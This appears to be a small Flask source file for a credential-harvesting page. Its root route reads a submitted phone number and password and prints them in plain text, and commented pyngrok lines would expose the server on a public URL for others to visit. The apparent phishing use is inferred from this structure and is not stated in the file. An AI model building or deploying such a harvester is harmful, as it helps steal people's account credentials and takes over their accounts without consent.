from flask import Flask, render_template, request, url_for, redirect
# from pyngrok import ngrok

app = Flask(__name__)

# ngrok.set_auth_token("your_auth_token_here")
# public_url = ngrok.connect(5000).public_url

@app.route("/", methods=['GET','POST'])
def home():
    if request.method == 'POST':
        name = request.form['phoneNumber']
        password = request.form['passwd']
        print(f'"{name}" is your phone number and "{password}" is your password')
    return render_template('index.html')

# print(f"To access public url please clink on {public_url}")
# app.run(port=5000)

@app.route("/welcome/", methods=['GET','POST'])
def welcome():
    return render_template("welcome.html")





if __name__ == '__main__':
    app.run(debug=True)
